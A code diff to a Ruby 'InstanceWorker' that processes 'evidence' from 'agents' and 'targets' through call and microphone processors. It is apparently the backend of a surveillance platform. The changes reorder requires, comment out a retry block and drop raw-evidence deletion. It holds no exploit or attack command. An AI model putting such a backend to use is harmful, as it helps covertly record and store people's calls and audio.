@@ -1,7 +1,3 @@
-require_relative 'call_processor'
-require_relative 'mic_processor'
-require_relative 'single_processor'
-
 # from RCS::Common
 require 'rcs-common/trace'
 require 'rcs-common/evidence'
@@ -17,6 +13,10 @@ else
   require 'rcs-db/grid'
   require 'rcs-db/alert'
 end
+
+require_relative 'call_processor'
+require_relative 'mic_processor'
+require_relative 'single_processor'
 
 require 'mongo'
 require 'openssl'
@@ -142,26 +142,19 @@ class InstanceWorker
 
               begin
                 evidence = processor.feed ev
-                #trace :debug, "EVIDENCE? #{evidence.inspect}"
                 #RCS::DB::Alerting.new_evidence evidence unless evidence.nil?
               rescue Exception => e
                 trace :error, "[#{evidence_id}:#{@ident}:#{@instance}] cannot store evidence, #{e.message}"
                 trace :error, "[#{evidence_id}:#{@ident}:#{@instance}] #{e.backtrace}"
-                trace :debug, "[#{evidence_id}:#{@ident}:#{@instance}] refreshing agent and target information and retrying."
-                get_agent_target
-                retry if attempt ||= 0 and attempt += 1 and attempt < 3
+                #trace :debug, "[#{evidence_id}:#{@ident}:#{@instance}] refreshing agent and target information and retrying."
+                #get_agent_target
+                #retry if attempt ||= 0 and attempt += 1 and attempt < 3
               end
 
             end
 
             processing_time = Time.now - start_time
             trace :info, "[#{evidence_id}] processed #{ev_type.upcase} for agent #{@agent['name']} in #{processing_time} sec"
-
-            case action
-              when :delete_raw
-                RCS::DB::GridFS.delete(evidence_id, "evidence")
-                trace :debug, "[#{evidence_id}:#{@ident}:#{@instance}] deleted raw evidence"
-            end
 
           rescue Mongo::ConnectionFailure => e
             trace :error, "[#{evidence_id}:#{@ident}:#{@instance}] cannot connect to database, retrying in 5 seconds ..."
